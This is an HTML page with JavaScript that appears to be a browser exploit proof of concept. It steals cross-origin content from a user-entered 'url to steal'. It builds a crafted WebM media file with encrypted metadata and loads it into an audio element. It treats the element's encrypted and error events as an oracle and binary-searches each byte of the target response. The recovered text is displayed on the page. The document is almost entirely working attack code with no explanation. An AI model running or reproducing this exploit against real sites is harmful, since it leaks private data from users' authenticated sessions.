<script>
  navigator.serviceWorker.register('sw.js');
</script>
<form onsubmit="location='?'+url.value;return false;">
<input type=url name=url placeholder='url to steal' autofocus onfocus='if(this.value==""&&location.search.length>0)this.value=location.search.slice(1)'>
<input type=submit>
</form>
Guess:<br/>
<span id="computed"></span>
<hr/>
<audio autoplay></audio>
<script>
audio=document.querySelector('audio');
guess=function (o, g, le){
return new Promise(function(resolve, reject){
url=location.search.slice(1);
audio.onencrypted=resolve;
audio.onerror=reject;
b1=(le>>8)%0xFF;
b2=(le)%0xFF;
offset=(o)%0x7F;
bodyLength=220;
totalLength=312+offset;
audio.src=url+'?&steps=bytes=0-:response:'+btoa((
String.fromCharCode(
0x1A,0x45,0xDF,0xA3,0x9F,0x42,0x86,0x81,0x01,0x42,0xF7,0x81,0x01,0x42,0xF2,0x81,
0x04,0x42,0xF3,0x81,0x08,0x42,0x82,0x84,0x77,0x65,0x62,0x6D,0x42,0x87,0x81,0x02,
0x42,0x85,0x81,0x02,0x18,0x53,0x80,0x67,0x01,0x00,0x00,0x00,0x00,0x03,0x68,0x7A,
0x11,0x4D,0x9B,0x74,0xBB,0x4D,0xBB,0x8B,0x53,0xAB,0x84,0x15,0x49,0xA9,0x66,0x53,
0xAC,0x81,0x6E,0x4D,0xBB,0x8B,0x53,0xAB,0x84,0x16,0x54,0xAE,0x6B,0x53,0xAC,0x81,
0xA8,0x4D,0xBB,0x8C,0x53,0xAB,0x84,0x1F,0x43,0xB6,0x75,0x53,0xAC,0x82,0x10,0x7D,
0x4D,0xBB,0x8D,0x53,0xAB,0x84,0x1C,0x53,0xBB,0x6B,0x53,0xAC,0x83,0x03,0x67,0x3E,
0xEC,0xAC,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x49,
0xA9,0x66,0xB5,0x2A,0xD7,0xB1,0x83,0x0F,0x42,0x40,0x44,0x89,0x84,0x45,0xBC,0x58,
0x00,0x4D,0x80,0x8F,0x6C,0x69,0x62,0x77,0x65,0x62,0x6D,0x2D,0x30,0x2E,0x32,0x2E,
0x31,0x2E,0x30,0x57,0x41,0x92,0x77,0x65,0x62,0x6D,0x5F,0x63,0x72,0x79,0x70,0x74,
0x20,0x30,0x2E,0x33,0x2E,0x31,0x2E,0x30,0x16,0x54,0xAE,0x6B,
0x4F,0xCF,
0xAE,
0x4F,0xFF,
// encrypted metadata
0xD7,0x81,0x01,0x73,0xC5,0x87,0x5B,0x14,0xFF,0x9A,0x8F,0xE4,0xBF,0x83,0x81,0x01,
0x86,0x85,0x56,0x5F,0x56,0x50,0x38,0x6D,0x80,0xB0,0x62,0x40,0xAD,0x50,0x31,0x81,
0x00,0x50,0x32,0x81,0x01,0x50,0x33,0x81,0x01,0x50,0x35,0x9E,0x47,0xE1,0x81,0x05,
0x47,0xE2,0x90,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x30,0x31,0x32,
0x33,0x34,0x35,0x47,0xE7,0x84,0x47,0xE8,0x81,0x01,
  0x22, 0xB5, 0x9C, // Dummy Track Language
  offset+0x80
)+
new Array(offset+1).join('s')+
String.fromCharCode(
0xE0, 0x88,
/*{*/
   0xBA, 0x82,
   /* { */
     b1, b2,
   /* } */
   0xB0, 0x82
   /* { */
      //, g, 0xFF
   /* } */
/* }*/
)))+':'+escape(JSON.stringify({status:206,headers:{'content-range':'bytes 0-'+(totalLength-3)+'/'+totalLength}}));
});
};
function getComplement2(x){return 0x7FFFFFFF/(8*(x+128))-128}
function getChar(o){
left=1;
right=0xffff;
test=Math.floor((left+right)/2);

function getNext() {
  middle=Math.floor((left+right)/2);
  if(middle==test||middle==left)
    middle++;
  return middle;
}

function cycle(answer) {
  if(answer) {
    left=test;
  } else {
    right=test;
  }
}

function ask() {
  //return Promise.resolve(test<1337);
  return new Promise(function(resolve){guess(o, 0, test).then(resolve.bind(null, true)).catch(resolve.bind(null, false))});
}

function binsearch() {
  if(test==right)return Promise.resolve(test);
  return ask().then(function(result) {
    console.log('@', o, ':', left, '<', test, '<', right, '=', result);
    cycle(result);
    test = getNext();
  }).then(binsearch);
}
return binsearch();
}

stop=false;
function bf() {
  var offset = 1;
  var buffer = [];
  setInterval(function() {
    document.querySelector('#computed').innerText=String.fromCharCode.apply(String, buffer);
  }, 100);
  var loop = function() {
    if(stop)return;
    getChar(offset).then(function(answer) {
      char = getComplement2(answer)>>8;
      buffer.push(char);
      console.log('>>>', String.fromCharCode.apply(String, buffer), offset, char);
      offset++;
      console.log('>>', offset, char);
      setTimeout(loop, 100);
    });
  };
  loop();
}
bf();
</script>
